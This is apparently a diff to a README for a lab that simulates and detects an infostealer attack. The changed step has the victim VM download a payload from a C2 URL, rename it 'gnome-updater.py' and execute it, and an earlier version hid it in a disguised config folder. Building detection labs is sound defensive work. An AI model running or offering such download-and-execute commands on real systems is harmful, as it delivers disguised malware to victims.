@@ -100,12 +100,8 @@ The project simulates a multi-stage attack, including the following key componen
 9. **Simulate and Detect the InfoStealer Attack**
     - On the victim VM, run (simulation of the USB):
       ```bash
-      mkdir -p ~/.config/.systemd-user/ && cd ~/.config/.systemd-user/
-
-      wget ${C2_URL}/security_debian_x386 -O gnome-updater.py && chmod +x gnome-updater.py && python3 gnome-updater.py
+      cd /tmp && wget ${C2_URL}/security_debian_x386 -O gnome-updater.py && chmod +x gnome-updater.py && python3 gnome-updater.py
       ```
-
-        ## **TODO: INSERT THE OTHER STEPS**
 
 10. **Destroy and Clean Up the Environment**
     - To remove all provisioned resources and avoid unnecessary charges, run:
